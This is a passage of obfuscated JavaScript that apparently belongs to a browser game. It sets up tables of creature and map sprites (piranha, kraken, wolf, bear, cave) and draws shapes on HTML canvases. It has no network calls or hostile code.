			ⵠⲆ[Ⲇ.ΔΔΔΔⵠᐃᐃ] = ⲆΔ.ΔΔΔΔⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠΔᐃᐃⲆΔ] = ⲆΔ.ᐃⵠΔᐃᐃⲆΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⲆⵠᐃⲆΔΔ;
			ⵠⲆ[Ⲇ.ⵠᐃᐃⵠⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆΔⵠⲆⲆΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃⵠᐃⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ΔⲆΔⵠⵠⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃᐃⲆⵠⵠΔ;
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆΔⲆⲆΔᐃ;
			ⵠⲆ[Ⲇ.ⲆᐃΔΔⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠΔⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ΔⲆΔᐃᐃⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆΔᐃᐃⵠᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆΔᐃᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⲆΔᐃᐃⵠᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆΔᐃᐃⵠᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃᐃᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⲆⲆΔᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ΔⲆⲆΔᐃᐃᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆⲆΔᐃᐃᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔΔⵠΔⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ΔΔⵠΔⵠⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔΔⵠΔⵠⲆᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⵠⲆΔⲆ] = ⲆΔ.ᐃⵠΔⵠⲆΔⲆ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠⵠΔⵠⵠΔΔ;
			ⵠⲆ[Ⲇ.ⲆⵠΔⲆⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆⲆΔΔⲆΔ;
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃⵠⲆΔΔⲆ;
			ⵠⲆ[Ⲇ.ⵠΔⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠⵠⵠᐃΔΔᐃ;
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃΔ][Ⲇ.ⲆⵠΔ] = [ⲆΔ.ᐃⵠⵠⲆΔⲆΔ, ⲆΔ.ᐃΔΔΔΔΔⵠ, ⲆΔ.ⲆⲆⵠΔⲆΔΔ, ⲆΔ.ᐃⲆⲆᐃᐃⵠⲆ, ⲆΔ.ᐃᐃⵠΔΔⵠΔ, ⲆΔ.ΔⲆᐃᐃᐃΔⲆ, ⲆΔ.ΔⵠᐃΔⵠⲆⲆ, ⲆΔ.ⵠΔⲆΔⲆⵠΔ, ⲆΔ.ΔⵠΔᐃΔⲆⵠ];
			ⵠⲆ[Ⲇ.ⲆⲆⵠᐃΔ][Ⲇ.ΔⲆΔ] = [ⲆΔ.ⵠΔⲆΔᐃⲆᐃ, ⲆΔ.ⵠΔΔⲆⲆᐃΔ, ⲆΔ.ⵠᐃᐃΔΔΔᐃ, ⲆΔ.ⵠⲆΔⵠΔⲆΔ, ⲆΔ.ⲆΔᐃⵠⲆⵠᐃ, ⲆΔ.ᐃᐃᐃΔΔⵠⲆ, ⲆΔ.ⵠΔΔⵠᐃⵠΔ, ⲆΔ.ⵠΔⲆΔⲆⵠΔ, ⲆΔ.ΔΔΔⵠᐃᐃΔ];
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃᐃⵠᐃⵠᐃᐃ;
			ⵠⲆ[Ⲇ.ΔⵠᐃⵠⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⵠᐃⵠⲆⵠᐃ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃΔΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃΔΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔᐃᐃⲆⲆᐃⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠⲆΔᐃΔΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ᐃⵠᐃⲆᐃⲆⲆ;
			ⵠⲆ[Ⲇ.ΔΔΔⲆⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ΔΔΔⲆⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠᐃᐃⵠᐃΔⵠ;
			ⵠⲆ[Ⲇ.ΔΔΔⲆⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆΔΔⵠⲆΔⵠ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ᐃΔᐃⵠᐃΔⲆ;
			ⵠⲆ[Ⲇ.ᐃⵠΔⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⲆΔⵠⵠⲆΔ;
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔᐃΔⲆᐃⵠΔⵠ;
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠΔ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠΔⲆⵠⵠΔⵠΔⵠ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ΔⵠⲆⵠΔΔΔ;
			ⵠⲆ[Ⲇ.ⲆᐃⲆᐃⲆ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⵠᐃⲆⲆᐃΔΔ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⵠ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⲆⲆΔΔΔⲆⵠ;
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔⵠ][Ⲇ.ΔⲆΔ] = ⲆΔ.ⲆⲆⲆⲆΔⵠⵠ;
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃΔᐃΔΔⵠⵠᐃΔ);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆⵠᐃΔⲆⲆⲆⲆⵠ);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆⲆΔⲆⵠΔⲆⲆΔ);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⵠᐃᐃⲆᐃᐃᐃΔ);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⲆⲆΔΔⲆⲆΔⵠⲆ);
			ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠΔⲆⲆΔⵠᐃⵠᐃ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆΔΔᐃΔΔΔᐃΔ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⲆΔⲆᐃⲆΔⵠΔ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃⲆⲆᐃΔⲆⵠᐃΔ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃΔⵠᐃᐃᐃⲆᐃⵠ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃΔⲆⲆΔⲆᐃⲆⲆ);
			ⵠⲆ[Ⲇ.ⲆⲆᐃΔᐃ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ΔΔΔΔᐃⲆΔᐃᐃ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ⲆⵠᐃΔΔΔⲆᐃⲆ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ᐃᐃᐃΔⲆⵠᐃᐃⵠ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ⲆⵠΔ].push(ⲆΔ.ΔΔΔΔᐃΔᐃⵠΔ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ⵠᐃΔⲆΔⵠΔⵠⵠ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃⵠⵠᐃⵠⵠⵠⵠᐃ);
			ⵠⲆ[Ⲇ.ⵠⲆᐃⵠⲆ][Ⲇ.ΔⲆΔ].push(ⲆΔ.ᐃΔᐃΔᐃⵠΔⲆⵠ);
			ᐃⵠᐃⲆ["g"] = [];
			ᐃⵠᐃⲆ["g"][0] = [ⲆΔ.ⲆⲆᐃⵠΔᐃΔ, ⲆΔ.ᐃΔⵠⲆΔΔⲆ];
			ᐃⵠᐃⲆ["g"][ⵠΔᐃ] = ᐃⵠᐃⲆ["g"][0];
			ᐃⵠᐃⲆ["g"][ᐃⲆΔⲆ] = [ⲆΔ.ᐃⵠᐃΔⵠᐃⲆ, ⲆΔ.ΔΔⵠᐃⵠΔⲆ];
			ᐃⵠᐃⲆ["m"] = [];
			ᐃⵠᐃⲆ["m"][0] = [ⲆΔ.ᐃΔΔΔᐃⲆᐃ, ⲆΔ.ⲆⵠⲆΔᐃⲆΔ];
			ᐃⵠᐃⲆ["m"][ⵠΔⵠΔ] = ᐃⵠᐃⲆ["m"][ⲆΔⵠ];
			ᐃⵠᐃⲆ["m"][ⵠⵠΔⲆ] = [ⲆΔ.ΔⵠᐃᐃΔᐃΔ, ⲆΔ.ⲆᐃⵠΔΔᐃⵠ];
			ᐃⵠᐃⲆ[ⵠ[156]] = [];
			ᐃⵠᐃⲆ[ⵠ[156]][0] = [ⲆΔ.ᐃⲆᐃΔⲆΔΔ, ⲆΔ.ΔⲆᐃΔⵠⲆΔ];
			ᐃⵠᐃⲆ[ⵠ[156]][ᐃⲆᐃ] = ᐃⵠᐃⲆ[ⵠ[156]][ⵠⲆⲆ];
			ᐃⵠᐃⲆ[ⵠ[156]][ⵠΔⲆᐃ] = ᐃⵠᐃⲆ[ⵠ[156]][ⲆΔⵠ];
			ᐃⵠᐃⲆ[ⵠ[156]][ΔᐃⲆΔ] = ᐃⵠᐃⲆ[ⵠ[156]][0];
			ᐃⵠᐃⲆ[ⵠ[156]][4] = ᐃⵠᐃⲆ[ⵠ[156]][ΔⲆⲆ];
			ᐃⵠᐃⲆ[ⵠ[156]][ᐃᐃⲆᐃ] = ᐃⵠᐃⲆ[ⵠ[156]][Ⲇᐃᐃᐃ];
			ᐃⵠᐃⲆ["s"] = [];
			ᐃⵠᐃⲆ["s"][ΔΔⵠⵠ] = [ⲆΔ.ᐃᐃⲆᐃΔⵠᐃ, ⲆΔ.ⵠᐃⵠⵠᐃⵠⵠ];
			ᐃⵠᐃⲆ["s"][1] = ᐃⵠᐃⲆ["s"][0];
			ᐃⵠᐃⲆ["s"][Ⲇⵠⵠᐃ] = [ⲆΔ.ΔⵠΔⵠᐃΔⵠ, ⲆΔ.ΔⵠᐃⵠᐃⲆⲆ];
			ᐃⵠᐃⲆ["p"] = [];
			ᐃⵠᐃⲆ["p"][ΔΔⵠⵠ] = [ⲆΔ.ΔⵠⵠΔⲆⵠⲆ, ⲆΔ.ΔⵠⵠΔⲆⵠⲆ];
			ᐃⵠᐃⲆ["a"] = [];
			ᐃⵠᐃⲆ["a"][ΔᐃΔΔ] = [ⲆΔ.ⵠΔΔⵠΔⵠⵠ, ⲆΔ.ΔΔΔⵠᐃⲆΔ];
			ᐃⵠᐃⲆ["a"][ᐃΔᐃⲆ] = ᐃⵠᐃⲆ["a"][0];
			ᐃⵠᐃⲆ["a"][ΔⵠⵠΔ] = ᐃⵠᐃⲆ["a"][0];
			ᐃⵠᐃⲆ["d"] = [];
			ᐃⵠᐃⲆ["d"][0] = [ⲆΔ.ΔᐃᐃᐃΔΔⵠ, ⲆΔ.ᐃΔΔᐃⲆΔᐃ];
			ᐃⵠᐃⲆ["d"][ⵠΔⲆ] = ᐃⵠᐃⲆ["d"][0];
			ᐃⵠᐃⲆ["d"][Δᐃⵠⵠ] = ᐃⵠᐃⲆ["d"][ⲆⲆⲆᐃ];
			ᐃⵠᐃⲆ[ⵠ[196]] = [];
			ᐃⵠᐃⲆ[ⵠ[196]][ⲆⲆⲆᐃ] = [ⲆΔ.ⵠᐃᐃᐃⵠⲆᐃ, ⲆΔ.ᐃⲆΔᐃⲆΔⲆ];
			ᐃⵠᐃⲆ[ⵠ[196]][1] = ᐃⵠᐃⲆ[ⵠ[196]][0];
			ᐃⵠᐃⲆ[ⵠ[196]][2] = ᐃⵠᐃⲆ[ⵠ[196]][0];
			ᐃⵠᐃⲆ["f"] = [];
			ᐃⵠᐃⲆ["f"][Δᐃᐃⵠ] = [ⲆΔ.ΔᐃⲆᐃΔⵠⵠ, ⲆΔ.ⲆⵠⲆᐃⵠᐃⲆ];
			ᐃⵠᐃⲆ["f"][ⵠΔⲆ] = ᐃⵠᐃⲆ["f"][Ⲇᐃᐃᐃ];
			ᐃⵠᐃⲆ["f"][Δⵠⵠⵠ] = ᐃⵠᐃⲆ["f"][ᐃⵠⲆⵠ];
			ᐃⵠᐃⲆ[ⵠ[424]] = [];
			ᐃⵠᐃⲆ[ⵠ[424]][0] = [ⲆΔ.ⲆⲆⲆⵠΔΔⲆ, ⲆΔ.ⲆᐃᐃⵠⲆⲆΔ];
			ᐃⵠᐃⲆ[ⵠ[424]][1] = ᐃⵠᐃⲆ[ⵠ[424]][ᐃⵠΔ];
			ᐃⵠᐃⲆ[ⵠ[424]][2] = ᐃⵠᐃⲆ[ⵠ[424]][0];
			ᐃⵠᐃⲆ["c"] = [];
			ᐃⵠᐃⲆ["c"][Ⲇᐃᐃᐃ] = [ⲆΔ.ⲆΔⲆⲆΔⵠΔ, ⲆΔ.ⲆᐃⵠΔⲆⵠⲆ];
			ᐃⵠᐃⲆ["c"][ΔᐃᐃⲆ] = ᐃⵠᐃⲆ["c"][ᐃⵠΔ];
			ᐃⵠᐃⲆ["c"][ⲆᐃᐃⲆ] = ᐃⵠᐃⲆ["c"][0];
			ᐃⵠᐃⲆ[ⵠ[26]] = [];
			ᐃⵠᐃⲆ[ⵠ[26]][ΔⲆⲆ] = [ⲆΔ.ⵠⵠᐃᐃⲆΔΔ, ⲆΔ.ᐃⵠΔΔⲆⵠᐃ];
			ᐃⵠᐃⲆ["PIRANHA"] = [ⲆΔ.ΔΔΔⲆΔⲆⵠ, ⲆΔ.ⲆⵠΔⵠⲆᐃᐃ];
			ᐃⵠᐃⲆ["KRAKEN"] = [ⲆΔ.ⵠⵠⲆⵠᐃⲆⲆ, ⲆΔ.ⲆΔΔΔⵠⵠᐃ];
			ᐃⵠᐃⲆ["FOX"] = [ⲆΔ.ᐃᐃᐃΔⲆᐃⲆ, ⲆΔ.ⲆⵠᐃⵠᐃᐃⲆ];
			ᐃⵠᐃⲆ["WOLF"] = [ⲆΔ.ⵠⲆᐃΔⵠΔᐃ, ⲆΔ.ⲆᐃⲆΔᐃΔⲆ];
			ᐃⵠᐃⲆ["SPIDER"] = [ⲆΔ.ⵠΔⲆⲆΔⲆᐃ, ⲆΔ.Δᐃᐃⵠⵠᐃᐃ];
			ᐃⵠᐃⲆ["BEAR"] = [ⲆΔ.ⵠᐃᐃⵠᐃⲆⲆ, ⲆΔ.ΔᐃΔΔΔⵠᐃ];
			ᐃⵠᐃⲆ["CAVE"] = [ⲆΔ.ΔᐃⲆⲆᐃᐃΔ, ⲆΔ.ᐃⲆⲆⵠΔⲆⵠ];
			ᐃⵠᐃⲆ["MAP"] = [ⲆΔ.ⵠⲆΔⲆᐃⲆᐃ, ⲆΔ.ᐃⵠⲆⲆᐃⵠᐃ];
			ᐃⵠᐃⲆ[ⵠ[573]] = [ⲆΔ.ΔᐃΔⲆⲆⵠᐃ, ⲆΔ.ᐃᐃⲆⲆⵠᐃⲆ];
			ᐃⵠᐃⲆ[ⵠ[437]] = [ⲆΔ.ᐃⵠΔⵠΔᐃΔ, ⲆΔ.ⲆⵠΔΔⲆⵠⲆ];
			ᐃⵠᐃⲆ[ⵠ[33]] = [ⲆΔ.ⵠⵠΔᐃⵠⵠᐃ, ⲆΔ.ⲆᐃΔΔΔⵠᐃ];
			ᐃⵠᐃⲆ[ⵠ[262]] = [ⲆΔ.ΔΔⵠⲆᐃⲆΔ, ⲆΔ.ΔᐃΔⵠΔᐃᐃ];
			for (var ⵠⲆⵠΔΔᐃⵠⲆⲆ in ᐃⵠᐃⲆ) {
				var ⲆΔΔᐃⵠⲆΔ = ᐃⵠᐃⲆ[ⵠⲆⵠΔΔᐃⵠⲆⲆ];
				for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔΔᐃⵠⲆΔ.length; ⵠᐃ++) {
					var ⵠⲆⵠⲆⵠΔⲆ = ⲆΔΔᐃⵠⲆΔ[ⵠᐃ];
					if (ⵠⲆⵠⲆⵠΔⲆ.ΔⲆᐃΔΔᐃΔ !== undefined) ⵠⲆⵠⲆⵠΔⲆ.ΔⲆᐃΔΔᐃΔ();
					else if (ⵠⲆⵠⲆⵠΔⲆ.length > 0) {
						for (var ᐃⵠᐃⵠ = ᐃΔΔ; ᐃⵠᐃⵠ < ⵠⲆⵠⲆⵠΔⲆ.length; ᐃⵠᐃⵠ++) {
							if (ⵠⲆⵠⲆⵠΔⲆ[ᐃⵠᐃⵠ].ΔⲆᐃΔΔᐃΔ !== ⲆΔⵠⲆⵠ) ⵠⲆⵠⲆⵠΔⲆ[ᐃⵠᐃⵠ].ΔⲆᐃΔΔᐃΔ()
						}
					}
				}
			}
			console.log(undefined, undefined)
		}

		function ᐃⲆᐃⲆᐃⵠⲆΔⵠ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 253;
			Ⲇⵠ.height = 192 * ᐃ;
			Δ.save();
			Δ.translate(37 * ᐃ, 94 * ᐃ);
			Ⲇᐃᐃ(Δ, -7 * ᐃ, -20 * ᐃ, ᐃ * 14, ᐃ * 37, ᐃ * 20);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
			Δ.save();
			Δ.translate(131 * ᐃ, ᐃ * 94);
			Ⲇᐃᐃ(Δ, ᐃ * -84, -67 * ᐃ, 168 * ᐃ, 134 * ᐃ, ⵠⲆⲆⲆⲆ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0], Ⲇᐃ[ΔΔⵠⵠ], 13 * ᐃ);
			Δ.save();
			Δ.translate(223 * ᐃ, 94.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -5 * ᐃ, ᐃ * -18.5, ᐃ * ΔⲆⵠⲆⲆ, ᐃ * 37, ᐃ * Δⵠᐃᐃᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.save();
			Δ.translate(128.5 * ᐃ, 170.5 * ᐃ);
			Ⲇᐃᐃ(Δ, -22.5 * ᐃ, -6.5 * ᐃ, ᐃ * 45, ᐃ * 13, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ΔⵠᐃΔⵠᐃⲆ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 110;
			Ⲇⵠ.height = 110 * ᐃ;
			Δ.globalAlpha = .2;
			ⵠᐃᐃ(Δ, 55 * ᐃ, 55 * ᐃ, ᐃ * 55);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ΔⲆᐃⵠᐃⲆΔⲆᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 110;
			Ⲇⵠ.height = ᐃ * 110;
			Δ.globalAlpha = .2;
			ⵠᐃᐃ(Δ, 55 * ᐃ, 55 * ᐃ, ᐃ * 55);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			return Ⲇⵠ
		}

		function ᐃΔΔᐃⲆⲆⵠⵠᐃ() {
			var ᐃ = ᐃⲆᐃ;
			var ⲆᐃΔᐃⵠⵠΔⲆⵠ = (new Date).getTime();
			ΔᐃⵠⲆⲆΔⵠ();
			ⲆⵠᐃⲆⲆΔⵠⲆⲆ();
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][Ⲇ.ΔⲆΔ] = [];
			for (var ⵠᐃ = 0; ⵠᐃ < Ⲇ.ΔⲆᐃᐃΔⵠⲆ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 4 + ⵠᐃ, "#59B8CE")));
				ⵠⲆ[Ⲇ.ⵠᐃᐃᐃⵠᐃⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 4 + ⵠᐃ, "#90DDD9")))
			}
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ] = [];
			for (var ⵠᐃ = ᐃⵠⲆⵠ; ⵠᐃ < Ⲇ.ᐃⲆⵠⲆⲆΔᐃ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 4 + ⵠᐃ, ⵠ[433])));
				ⵠⲆ[Ⲇ.ⲆⵠⲆᐃᐃⲆⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, Ⲇᐃⵠᐃ + ⵠᐃ, ⵠ[433])))
			}
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆᐃⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆᐃⲆ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆᐃⲆ][Ⲇ.ΔⲆΔ] = [];
			for (var ⵠᐃ = ᐃⵠⲆ; ⵠᐃ < Ⲇ.ᐃⲆⵠⲆⲆΔᐃ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆᐃⲆ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, ΔⵠⵠⲆΔ + ⵠᐃ, "#DDCD8A")));
				ⵠⲆ[Ⲇ.ⵠⲆΔᐃⲆᐃⲆ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 6 + ⵠᐃ, "#155E57")))
			}
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⲆᐃⲆᐃ][Ⲇ.ΔⲆΔ] = [];
			for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < Ⲇ.ⲆΔΔᐃᐃΔⲆ; ⵠᐃ++) {
				ⵠⲆ[Ⲇ.ΔⲆⵠⲆᐃⲆᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 4 + ⵠᐃ, "#353326")));
				ⵠⲆ[Ⲇ.ΔⲆⵠⲆᐃⲆᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆⵠΔⲆᐃΔΔ(ᐃ, 4 + ⵠᐃ, "#1D2526")))
			}
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, ⵠᐃⲆᐃΔ, ["#ee71a9"]));
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(1.5 * ᐃ, ᐃⵠΔᐃΔ, ["#ee71a9"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ] = [ⵠⲆ[Ⲇ.ᐃⲆⲆⲆᐃ]];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][1] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][2] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][ⲆΔⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][4] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][1][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, true, ["#e2d63b"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][1][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, ⵠⲆΔᐃⲆ, ["#e2d63b"]));
